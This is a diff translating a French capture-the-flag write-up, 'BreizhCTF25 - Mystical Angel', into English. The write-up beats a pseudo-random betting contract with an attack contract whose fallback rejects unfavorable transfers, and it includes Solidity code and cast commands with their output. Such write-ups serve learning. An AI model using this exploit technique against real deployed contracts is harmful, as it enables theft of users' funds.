@@ -2,7 +2,7 @@
 authors:
   - K.L.M
 title: "BreizhCTF25 - Mystical Angel"
-description: "Résolution d'un contrat de pari pseudo-aléatoire : filtrer les transferts défavorables avec un fallback, accumuler les blessings et appeler ascend."
+description: "Solve a pseudo-random betting contract by rejecting unfavorable transfers with a fallback, accumulating blessings, then calling ascend."
 publicationDate: 2025-03-17 00:00:00+0000
 cover: ../../../assets/blog/mystical-angel-web3/cover.png
 coverAlt: "BreizhCTF25 - Mystical Angel"
@@ -13,11 +13,11 @@ tags:
   - Blockchain
   - CTF
 ---
-## Contrat
+## Contract
 
-Ce contrat est une simulation d'un jeu similaire à un pile ou face avec un ange (?).
+This contract simulates a coin-flip-like game with an angel (?).
 
-Notre but est de remplir la condition "isSolved()", pour ce faire, nous remarquons que nous devons appeler la fonction :
+Our goal is to satisfy the `isSolved()` condition. To do that, we need to call this function:
 ```solidity
 function ascend() public payable {
         require(blessings[msg.sender] >= 10,"You have not proved your worthiness :((");
@@ -25,7 +25,7 @@ function ascend() public payable {
     }
 ```
 
-Afin d'obtenir 10 blessings, nous nous intéressons à la partie du code suivante:
+To get 10 blessings, we look at this part of the code:
 ```solidity
 function Blessing() public payable {
     require(msg.value == 1 ether, "You must pay the right to get your blessing");
@@ -45,15 +45,15 @@ function Blessing() public payable {
     }
 }
 ```
-Il calcule une valeur "random" dont nous n'avons pas connaissance, puis en fonction de sa valeur, il nous renvoie une transaction contenant 0 ou 1 ether puis nous ajoute un blessing ou nous les retire tous. 
+It computes a "random" value we do not know. Depending on that value, it sends us a transaction containing 0 or 1 ether, then either adds one blessing or removes all of them.
 
-## Résolution
+## Solution
 
-Une manière simple de réussir à obtenir uniquement des bonnes conditions viserait à ne jamais rentrer dans l'instruction : `blessings[msg.sender] = 0;` et pour ça nous pouvons utiliser une petite astuce : Rejeter tout envoi de fonds qui n'est pas égal à 1 ether.
+A simple way to keep only favorable outcomes is to avoid ever reaching `blessings[msg.sender] = 0;`. For that, we can use a small trick: reject any fund transfer that is not equal to 1 ether.
 
-Mais comment on fait K.L.M ?
+But how do we do that, K.L.M?
 
-Comme ça !
+Like this:
 ```solidity
 fallback() payable external{
         if (msg.value != 1 ether){
@@ -62,7 +62,7 @@ fallback() payable external{
     }
 ```
 
-Maintenant on écris un contrat d'attaque (dispo dans le dossier sous le nom attack.sol):
+Now we write an attack contract, available in the folder as `attack.sol`:
 
 ```solidity
 // SPDX-License-Identifier: UNLICENSED
@@ -98,25 +98,24 @@ contract Attack {
 }
 ```
 
-Maintenant il ne reste plus qu'à le déployer, exporter nos variables d'environnement sous la forme : \$ATK = adresse du contrat attack, \$TAR = adresse du contrat cible, \$PK = clé privée, \$RPC = URL du RPC
-Et à realiser la suite de commande suivante :
+Now all that remains is to deploy it, export our environment variables (`$ATK` = attack contract address, `$TAR` = target contract address, `$PK` = private key, `$RPC` = RPC URL), and run the following commands:
 
 ```bash
 cast send $ATK "setTarget(address)" $TAR -r $RPC --private-key $PK
-cast send $ATK "attack()" -r $RPC --private-key $PK --value 1ether # pour envoyer 1 ether au contrat pour pouvoir call la fonction, si ce n'est pas bon, il faut réessayer.
+cast send $ATK "attack()" -r $RPC --private-key $PK --value 1ether # send 1 ether to the contract so we can call the function; if it fails, retry.
 
-cast b $ATK -r $RPC # par exemple ici ce n'était pas bon.
+cast b $ATK -r $RPC # for example, here it did not work.
 0
 
 cast send $ATK "attack()" -r $RPC --private-key $PK --value 1ether
 cast b $ATK -r $RPC
-1000000000000000000 # ça a fonctionné
+1000000000000000000 # it worked
 
-cast send $ATK "attack()" -r $RPC --private-key $PK # à répeter autant de fois que nécessaire
+cast send $ATK "attack()" -r $RPC --private-key $PK # repeat as many times as needed
 
 cast call $TAR "blessings(address)(uint256)" $ATK -r $RPC
-13 # supérieur à 10, on est bon !
+13 # greater than 10, we are good!
 ```
 
-Win !
-On récupère ensuite notre flag sur la plateforme.
+Win!
+We then retrieve our flag on the platform.
